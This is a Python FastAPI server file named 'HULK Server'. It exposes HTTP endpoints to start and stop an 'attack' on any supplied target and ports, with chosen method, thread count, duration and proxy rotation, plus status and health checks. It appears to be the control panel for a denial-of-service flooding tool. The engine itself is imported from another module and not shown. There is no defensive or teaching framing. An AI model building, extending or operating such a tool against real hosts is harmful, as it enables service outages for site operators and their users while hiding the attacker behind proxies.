from fastapi import FastAPI, HTTPException
from contextlib import asynccontextmanager

from models import AttackRequest, AttackStats
from attack_engine import engine
from proxy_pool import proxy_pool
from config import settings


@asynccontextmanager
async def lifespan(app: FastAPI):
    if settings.proxy_file:
        count = proxy_pool.load_file(settings.proxy_file)
        print(f"[proxy] loaded {count} proxies from {settings.proxy_file}")
    yield
    if engine.is_running:
        await engine.stop()


app = FastAPI(title="HULK Server", version="4.0", lifespan=lifespan)


@app.post("/attack/start")
async def attack_start(req: AttackRequest):
    await engine.start(
        target=req.target,
        ports=req.ports,
        method=req.method,
        threads=min(req.threads, settings.max_threads),
        duration=req.duration,
        use_proxies=req.use_proxies,
    )
    return {"status": "started", "target": req.target, "ports": req.ports}


@app.post("/attack/stop")
async def attack_stop():
    if not engine.is_running:
        raise HTTPException(404, "No active attack")
    await engine.stop()
    return {"status": "stopped"}


@app.get("/status", response_model=AttackStats)
async def get_status():
    return engine.stats.snapshot()


@app.get("/health")
async def health():
    return {"alive": True}
